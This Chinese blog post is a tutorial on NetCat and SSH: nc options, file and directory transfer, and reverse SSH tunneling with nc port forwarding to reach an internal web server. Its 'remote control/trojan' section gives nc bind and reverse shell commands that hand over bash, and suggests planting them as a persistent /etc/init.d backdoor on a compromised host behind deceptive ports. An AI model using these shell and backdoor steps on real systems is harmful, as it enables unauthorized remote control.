---
layout: post
title:  "网络安全－SSH和NetCat内网穿透"
categories: 网络安全
tags: 网络安全 SSH NetCat
author: xueyp
description: 使用SSH和NetCat实现内网穿透
---

SSH&NetCat
============

　　SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。

　　通过使用SSH，可以把所有传输的数据进行加密，这样"中间人"这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的"通道"。

　　NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end) 工具，通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。

　　NetCat还可以当服务器使用，监听任意指定端口的连接请求(inbound connection)，并可做同样的读写操作。

　　总的来说，NC所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就完全由自己做主了。例如建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。

- **语法**
```
nc/netcat(选项)(参数)
    选项
        -g<网关>：设置路由器跃程通信网关，最多设置8个；
        -G<指向器数目>：设置来源路由指向器，其数值为4的倍数；
        -h：在线帮助；
        -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口；
        -l：使用监听模式，监控传入的资料；
        -n：直接使用ip地址，而不通过域名服务器；
        -o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；
        -p<通信端口>：设置本地主机使用的通信端口；
        -r：指定源端口和目的端口都进行随机的选择；
        -s<来源位址>：设置本地主机送出数据包的IP地址；
        -u：使用UDP传输协议；
        -v：显示指令执行过程；
        -w<超时秒数>：设置等待连线的时间；
        -z：使用0输入/输出模式，只在扫描通信端口时使用。
```

- **为什么不用telnet来连接任意的端口?**
 
　　Telnet有“标准输入文件结束符(standard input EOF)”问题，所以需要在脚本中延迟计算以便等待网络输出结束。这就是netcat持续运行直到连接被关闭的主要原因。Telnet也不能传输任意的二进制数据，因为一些特定的字符会被解释为Telnet的参数而被从数据流中去除。Telnet还将它的一些诊断信息显示到标准输出上，而NC会将这信息与它的输出分开以不改变真实数据的传输，除非你要求它这么做。当然了，Telnet也不能监听端口，也不能使用UDP。NC没有这些限制，比Telnet更小巧和快捷，而且还有一些其它的功能。

命令示例
============

　　假设有Ａ和Ｂ两台电脑ｉｐ可达。

1 **传输文件**

　　A作为接受端打开端口：
```
$ nc -lp 3333 > 1.mp4  
将侦听到的3333端口的信息输出到1.mp4文件中
```

　　B端为发送端:
```
$ nc -nv 1.1.1.1 3333 < 1.mp4 -q 1  将1.mp4文件的内容宿儒到目标ip的3333端口，传递完成一秒后断开连接
```

　　或者A作为发送端打开端口:
```
$ nc -q 1 -lp 3333 <a.mp4  -q 1 将文件放在3333端口下，等着别人来下载,文件传输完成后1秒断开连接
```
　　B作为接收端:
```
$ nc -nv 1.1.1.1 333 >a.mp4
```

2 **传输目录**

　　nc本身并不支持目录传送，而是必须结合其它的命令来完成。通常先将目录进行打包，让后将其通过管道灌到nc的一个端口，让后在接收端通过nc去连接服务器已经打开的侦听端口，当接收端得到打包的文件后在通过tar去解包重新还原出目录。
```
$ tar -cvf - filename/ | nc -lp 333 -q 1     
先打包目录，前一个tar打包命令的结果通过管道成为nc命令的输入，即将tar过的文件传到333端口里面，等人家来连接 

$ nc 192.168.14.20 333 | tar -xvf -   
将接收到tar文件重定向后进行解包
```

3 **远程控制/木马**

　　nc远程控制可以实现双向的远程控制，服务器端可以是控制端，也可以是被控制端。

- **正向**:

A:服务端
```
$nc -lp 333 -c bash  
通过nc建立的连接将bash传递给对方；符合我们通常的一个使用习惯吧，又服务器侦听一个端口，通过客户端来连接这个端口时，服务器端把自己的bash shell传递给客户端！
```
B:客户端
```
$nc -nv 192.168.14.23 333   
```

　　当渗透进入对方操作系统后，在对方/etc/init.d目录下添加nc执行脚本添加此后门，以后可以随时连接此后门。但由于对方防火墙配置通常无法连接。

- **反向**:

A:服务器端，负者侦听端口,但不传递shell:
```
$: nc -lp 333
```
B：客户端
```
$: nc -nv 192.168.14.23 33 -c bash  通过nc连接到服务器端并将shell传递给服务器端成为被控制端
```
　　在进入对方系统后，在本机侦听一个端口，然后在对方系统执行启动脚本将shell传送给自己!,通常使用53，80等有欺骗性的端口。在windows下也可用，只需要将bash换成cmd就ok。

4 **其他**

　　文本聊天／硬盘copy／流媒体服务／端口扫描等。

内网穿透
============

**环境如下**：

    内网机 A 10.0.11.5 运行web服务在80

    VPS公网 B 21.237.x.x ssh端口 12580,有root权限

    访问内网服务使用自己的笔记本，可以连接公网 C, 目标连接内网的 redis

1 B->A 建立反向ssh隧道，在内网机A 上操作
```
ssh -fN -R 8088:localhost:80 root@45.xx.xx.xx -p 12580
```

　　这个命令的含义是，通过 SSH 把本地的80端口映射到远程vps的 8088 端口（通过12580端口连接），执行命令需要输入密码（或者使用key做免密码登陆)

2 执行上述命令之后，在 vps 上查看
```
# netstat -ntpl |grep 8088
tcp        0      0 127.0.0.1:8088          0.0.0.0:*               LISTEN      12580/sshd: root
```
 
　　访问ｖｐｓ的8088即访问内网机Ａ的80端口，但是8088 端口绑定的是 127.0.0.1 端口，无法被外部访问，需要再来个端口映射，把绑定到 0.0.0.0 的某个端口映射到 8088 端口。
```
nc -l -p 8001 -c "nc 127.0.0.1 8088" -vv
```
　　这样就把本机的8088端口映射到了8001端口，ｖｐｓ监听８００１端口，客户端通过连接8001端口即可实现访问内网机Ａ的80端口。

3 在本地的电脑浏览器中输入http://221.237.x.x:8001 即可成功访问Ａ网站。



版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
